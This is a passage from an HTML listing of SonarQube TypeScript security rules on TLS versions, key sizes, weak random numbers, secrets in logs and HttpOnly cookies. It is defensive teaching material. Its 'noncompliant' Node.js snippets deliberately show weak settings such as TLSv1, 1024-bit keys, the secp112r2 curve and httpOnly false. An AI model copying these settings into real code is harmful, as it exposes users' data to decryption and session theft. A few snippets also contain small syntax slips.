  cycle, because the IV’s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li><li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul><li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li><li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
// &#61;&#61;&#61; Client side &#61;&#61;&#61;
crypto.subtle.encrypt(algo, key, plainData); // Sensitive
crypto.subtle.decrypt(algo, key, encData); // Sensitive
</pre>
<pre>
// &#61;&#61;&#61; Server side &#61;&#61;&#61;
const crypto &#61; require(&#34;crypto&#34;);
const cipher &#61; crypto.createCipher(algo, key); // Sensitive
const cipheriv &#61; crypto.createCipheriv(algo, key, iv); // Sensitive
const decipher &#61; crypto.createDecipher(algo, key); // Sensitive
const decipheriv &#61; crypto.createDecipheriv(algo, key, iv); // Sensitive
const pubEnc &#61; crypto.publicEncrypt(key, buf); // Sensitive
const privDec &#61; crypto.privateDecrypt({ key: key, passphrase: secret }, pubEnc); // Sensitive
const privEnc &#61; crypto.privateEncrypt({ key: key, passphrase: secret }, buf); // Sensitive
const pubDec &#61; crypto.publicDecrypt(key, privEnc); // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/321" rel="nofollow">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li><li> <a href="https://cwe.mitre.org/data/definitions/322" rel="nofollow">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li><li> <a href="https://cwe.mitre.org/data/definitions/323" rel="nofollow">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li><li> <a href="https://cwe.mitre.org/data/definitions/324" rel="nofollow">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li><li> <a href="https://cwe.mitre.org/data/definitions/325" rel="nofollow">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4423">
              typescript:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>NodeJs offers multiple ways to set weak TLS protocols. For https and tls, <a href="https://nodejs.org/api/tls.html#tlscreatesecurecontextoptions" rel="nofollow">these options</a> are used and are used in other third-party libraries as
well.</p>
<p>The first is <code>secureProtocol</code>:</p>
<pre data-diff-id="11" data-diff-type="noncompliant">
const https &#61; require(&#39;node:https&#39;);
const tls   &#61; require(&#39;node:tls&#39;);

let options &#61; {
 secureProtocol: &#39;TLSv1_method&#39; // Noncompliant
};

let req    &#61; https.request(options, (res) &#61;&gt; { });
let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; { });
</pre>
<p>The second is the combination of <code>minVersion</code> and <code>maxVerison</code>. Note that they cannot be specified along with the
<code>secureProtocol</code> option:</p>
<pre data-diff-id="12" data-diff-type="noncompliant">
const https &#61; require(&#39;node:https&#39;);
const tls   &#61; require(&#39;node:tls&#39;);

let options &#61; {
  minVersion: &#39;TLSv1.1&#39;,  // Noncompliant
  maxVersion: &#39;TLSv1.2&#39;
};

let req    &#61; https.request(options, (res) &#61;&gt; { });
let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; { });
</pre>
<p>And <code>secureOptions</code>, which in this example instructs the OpenSSL protocol to turn off some algorithms altogether. In general, this
option might trigger side effects and should be used carefully, if used at all.</p>
<pre data-diff-id="13" data-diff-type="noncompliant">
const https     &#61; require(&#39;node:https&#39;);
const tls       &#61; require(&#39;node:tls&#39;);
const constants &#61; require(&#39;node:crypto&#39;):

let options &#61; {
  secureOptions:
    constants.SSL_OP_NO_SSLv2
    | constants.SSL_OP_NO_SSLv3
    | constants.SSL_OP_NO_TLSv1
}; // Noncompliant

let req    &#61; https.request(options, (res) &#61;&gt; { });
let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; { });
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
const https &#61; require(&#39;node:https&#39;);
const tls   &#61; require(&#39;node:tls&#39;);

let options &#61; {
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let req    &#61; https.request(options, (res) &#61;&gt; { });
let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; { });
</pre>
<pre data-diff-id="12" data-diff-type="compliant">
const https &#61; require(&#39;node:https&#39;);
const tls   &#61; require(&#39;node:tls&#39;);

let options &#61; {
  minVersion: &#39;TLSv1.2&#39;,
  maxVersion: &#39;TLSv1.2&#39;
};

let req    &#61; https.request(options, (res) &#61;&gt; { });
let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; { });
</pre>
<p>Here, the goal is to turn on only TLSv1.2 and higher, by turning off all lower versions:</p>
<pre data-diff-id="13" data-diff-type="compliant">
const https &#61; require(&#39;node:https&#39;);
const tls   &#61; require(&#39;node:tls&#39;);

let options &#61; {
  secureOptions:
    constants.SSL_OP_NO_SSLv2
    | constants.SSL_OP_NO_SSLv3
    | constants.SSL_OP_NO_TLSv1
    | constants.SSL_OP_NO_TLSv1_1
};

let req    &#61; https.request(options, (res) &#61;&gt; { });
let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; { });
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2245">
              typescript:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2013-6386" rel="nofollow">CVE-2013-6386</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-3419" rel="nofollow">CVE-2006-3419</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2008-4102" rel="nofollow">CVE-2008-4102</a> </li></ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>Math.random()</code> function relies on a weak pseudorandom number generator, this function should not be used for security-critical
applications or for protecting sensitive data. In such context, a cryptographically strong pseudorandom number generator (CSPRNG) should be used
instead.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li><li> the function you use generates a value which can be predicted (pseudo-random). </li><li> the generated value is used multiple times. </li><li> an attacker can access the generated value. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a cryptographically strong pseudorandom number generator (CSPRNG) like <code>crypto.getRandomValues()</code>. </li><li> Use the generated random values only once. </li><li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
const val &#61; Math.random(); // Sensitive
// Check if val is used in a security context.
</pre>
<h2>Compliant Solution</h2>
<pre>
// &#61;&#61;&#61; Client side &#61;&#61;&#61;
const crypto &#61; window.crypto || window.msCrypto;
var array &#61; new Uint32Array(1);
crypto.getRandomValues(array); // Compliant for security-sensitive use cases

// &#61;&#61;&#61; Server side &#61;&#61;&#61;
const crypto &#61; require(&#39;crypto&#39;);
const buf &#61; crypto.randomBytes(1); // Compliant for security-sensitive use cases
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/338" rel="nofollow">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
  </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/1241" rel="nofollow">MITRE, CWE-1241</a> - Use of Predictable Algorithm in Random Number Generator </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM" rel="nofollow">Predictable Pseudo Random Number
  Generator</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4426">
              typescript:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul><li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li><li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul><li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li></ul>  </li></ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br /> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const crypto &#61; require(&#39;crypto&#39;);

function callback(err, pub, priv) {}

var { privateKey, publicKey } &#61; crypto.generateKeyPairSync(&#39;rsa&#39;, {
    modulusLength: 1024,  // Noncompliant
    publicKeyEncoding:  { type: &#39;spki&#39;, format: &#39;pem&#39; },
    privateKeyEncoding: { type: &#39;pkcs8&#39;, format: &#39;pem&#39; }
  },
  callback);
</pre>
<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
const crypto &#61; require(&#39;crypto&#39;);

function callback(err, pub, priv) {}

var { privateKey, publicKey } &#61; crypto.generateKeyPairSync(&#39;dsa&#39;, {
    modulusLength: 1024,  // Noncompliant
    publicKeyEncoding:  { type: &#39;spki&#39;, format: &#39;pem&#39; },
    privateKeyEncoding: { type: &#39;pkcs8&#39;, format: &#39;pem&#39; }
  },
  callback);
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
const crypto &#61; require(&#39;crypto&#39;);

function callback(err, pub, priv) {}

var { privateKey, publicKey } &#61; crypto.generateKeyPair(&#39;ec&#39;, {
    namedCurve: &#39;secp112r2&#39;, // Noncompliant
    publicKeyEncoding:  { type: &#39;spki&#39;, format: &#39;pem&#39; },
    privateKeyEncoding: { type: &#39;pkcs8&#39;, format: &#39;pem&#39; }
  },
  callback);
</pre>
<h4>Compliant solution</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="compliant">
const crypto &#61; require(&#39;crypto&#39;);

function callback(err, pub, priv) {}

var { privateKey, publicKey } &#61; crypto.generateKeyPairSync(&#39;rsa&#39;, {
    modulusLength: 2048,
    publicKeyEncoding:  { type: &#39;spki&#39;, format: &#39;pem&#39; },
    privateKeyEncoding: { type: &#39;pkcs8&#39;, format: &#39;pem&#39; }
  },
  callback);
</pre>
<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>
<pre data-diff-id="2" data-diff-type="compliant">
const crypto &#61; require(&#39;crypto&#39;);

function callback(err, pub, priv) {}

var { privateKey, publicKey } &#61; crypto.generateKeyPairSync(&#39;dsa&#39;, {
    modulusLength: 2048,
    publicKeyEncoding:  { type: &#39;spki&#39;, format: &#39;pem&#39; },
    privateKeyEncoding: { type: &#39;pkcs8&#39;, format: &#39;pem&#39; }
  },
  callback);
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm
name:</p>
<pre data-diff-id="3" data-diff-type="compliant">
const crypto &#61; require(&#39;crypto&#39;);

function callback(err, pub, priv) {}

var { privateKey, publicKey } &#61; crypto.generateKeyPair(&#39;ec&#39;, {
    namedCurve: &#39;secp224k1&#39;,
    publicKeyEncoding:  { type: &#39;spki&#39;, format: &#39;pem&#39; },
    privateKeyEncoding: { type: &#39;pkcs8&#39;, format: &#39;pem&#39; }
  },
  callback);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br /> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms are mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC algorithms.</p>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br /> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
&#34;post-quantum&#34;) counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation" rel="nofollow">Learn more here</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" rel="nofollow">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths* <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption
  Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5757">
              typescript:S5757
            </a>
          </td>
          <td>
            <details>
              <p>Log management is an important topic, especially for the security of a web application, to ensure user activity, including potential attackers, is
recorded and available for an analyst to understand what’s happened on the web application in case of malicious activities.</p>
<p>Retention of specific logs for a defined period of time is often necessary to comply with regulations such as GDPR, <a href="https://www.pcisecuritystandards.org/documents/Effective-Daily-Log-Monitoring-Guidance.pdf" rel="nofollow">PCI DSS</a> and others. However, to protect user’s
privacy, certain informations are forbidden or strongly discouraged from being logged, such as user passwords or credit card numbers, which obviously
should not be stored or at least not in clear text.</p>
<h2>Ask Yourself Whether</h2>
<p>In a production environment:</p>
<ul><li> The web application uses confidential information and logs a significant amount of data. </li><li> Logs are externalized to SIEM or Big Data repositories. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Loggers should be configured with a list of confidential, personal information that will be hidden/masked or removed from logs.</p>
<h2>Sensitive Code Example</h2>
<p>With <a href="https://www.npmjs.com/package/signale" rel="nofollow">Signale log management framework</a> the code is sensitive when an empty list of secrets is
defined:</p>
<pre>
const { Signale } &#61; require(&#39;signale&#39;);

const CREDIT_CARD_NUMBERS &#61; fetchFromWebForm()
// here we suppose the credit card numbers are retrieved somewhere and CREDIT_CARD_NUMBERS looks like [&#34;1234-5678-0000-9999&#34;, &#34;1234-5678-0000-8888&#34;]; for instance

const options &#61; {
  secrets: []         // empty list of secrets
};

const logger &#61; new Signale(options); // Sensitive

CREDIT_CARD_NUMBERS.forEach(function(CREDIT_CARD_NUMBER) {
  logger.log(&#39;The customer ordered products with the credit card number &#61; %s&#39;, CREDIT_CARD_NUMBER);
});
</pre>
<h2>Compliant Solution</h2>
<p>With <a href="https://www.npmjs.com/package/signale" rel="nofollow">Signale log management framework</a> it is possible to define a list of secrets that will be
hidden in logs:</p>
<pre>
const { Signale } &#61; require(&#39;signale&#39;);

const CREDIT_CARD_NUMBERS &#61; fetchFromWebForm()
// here we suppose the credit card numbers are retrieved somewhere and CREDIT_CARD_NUMBERS looks like [&#34;1234-5678-0000-9999&#34;, &#34;1234-5678-0000-8888&#34;]; for instance

const options &#61; {
  secrets: [&#34;([0-9]{4}-?)&#43;&#34;]
};

const logger &#61; new Signale(options); // Compliant

CREDIT_CARD_NUMBERS.forEach(function(CREDIT_CARD_NUMBER) {
  logger.log(&#39;The customer ordered products with the credit card number &#61; %s&#39;, CREDIT_CARD_NUMBER);
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://cwe.mitre.org/data/definitions/532" rel="nofollow">MITRE, CWE-532</a> - Insertion of Sensitive Information into Log File </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html" rel="nofollow">OWASP Top 10 2017 Category
  A3</a> - Sensitive Data Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S3330">
              typescript:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li><li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/cookie-session" rel="nofollow">cookie-session</a> module:</p>
<pre>
let session &#61; cookieSession({
  httpOnly: false,// Sensitive
});  // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/express-session" rel="nofollow">express-session</a> module:</p>
<pre>
const express &#61; require(&#39;express&#39;),
const session &#61; require(&#39;express-session&#39;),

let app &#61; express()
app.use(session({
  cookie:
  {
    httpOnly: false // Sensitive
  }
})),
</pre>
